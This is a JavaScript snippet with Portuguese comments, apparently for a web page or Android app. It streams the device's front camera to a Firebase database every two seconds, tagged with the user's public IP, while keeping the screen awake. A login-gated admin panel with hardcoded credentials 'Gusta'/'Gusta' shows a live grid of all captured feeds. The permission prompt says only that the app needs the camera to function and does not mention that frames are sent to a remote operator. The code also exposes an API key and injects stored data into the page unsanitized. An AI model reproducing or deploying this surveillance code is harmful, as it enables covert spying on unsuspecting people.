<script>
    const firebaseConfig = {
        apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
        projectId: "cameralog-24090",
        appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
    };

    // Inicializa o Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    let meuIP = "carregando...";

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas-foto');

    // 1. FUNÇÃO PARA FORÇAR PERMISSÃO (Crucial para APK)
    async function pedirPermissaoECamera() {
        try {
            // Tenta acessar a câmera
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            video.srcObject = stream;
            
            // Tenta manter o celular acordado
            if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen').catch(()=>{}); }
            
            // Se chegou aqui, a câmera está ativa. Inicia o loop de envio.
            console.log("Câmera ativa com sucesso.");
            setInterval(capturarEAtualizar, 2000);
            
        } catch (err) {
            console.error("Erro ao acessar câmera: ", err);
            alert("ERRO: O App precisa de permissão de CÂMERA para funcionar. Vá em Configurações > Apps > Permissões.");
        }
    }

    // 2. PEGAR IP E INICIAR
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            meuIP = data.ip.replace(/\./g, '_');
            pedirPermissaoECamera(); // Chama a função de permissão
        })
        .catch(() => {
            meuIP = "IP_Desconhecido_" + Math.floor(Math.random() * 1000);
            pedirPermissaoECamera();
        });

    function capturarEAtualizar() {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            const context = canvas.getContext('2d');
            canvas.width = 320; 
            canvas.height = 240;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.3);
            
            db.collection("ips_ativos").doc(meuIP).set({
                ip_original: meuIP.replace(/_/g, '.'),
                last_ping: Date.now(),
                imagem: fotoBase64
            }).catch(e => console.error("Erro Firebase:", e));
        }
    }

    // FUNÇÕES DO PAINEL ADMIN (GUSTA)
    function verificarAdmin() {
        if (document.getElementById('usuario').value === "Gusta" && document.getElementById('senha').value === "Gusta") {
            document.getElementById('form-login').classList.add('hidden');
            document.getElementById('painel-admin').classList.remove('hidden');
            escutarMonitoramento();
        } else {
            alert("Acesso negado.");
        }
    }

    function escutarMonitoramento() {
        const grid = document.getElementById('grid-monitores');
        db.collection("ips_ativos").onSnapshot((snapshot) => {
            grid.innerHTML = "";
            const agora = Date.now();
            snapshot.forEach((doc) => {
                const dados = doc.data();
                const isOnline = (agora - dados.last_ping) / 1000 < 10;
                const card = document.createElement('div');
                card.className = `monitor-card ${isOnline ? 'online' : 'offline'}`;
                card.innerHTML = `
                    <span style="font-size:10px;"><span class="status-dot"></span>IP: ${dados.ip_original}</span>
                    <img src="${dados.imagem}">
                `;
                grid.appendChild(card);
            });
        });
    }
</script>
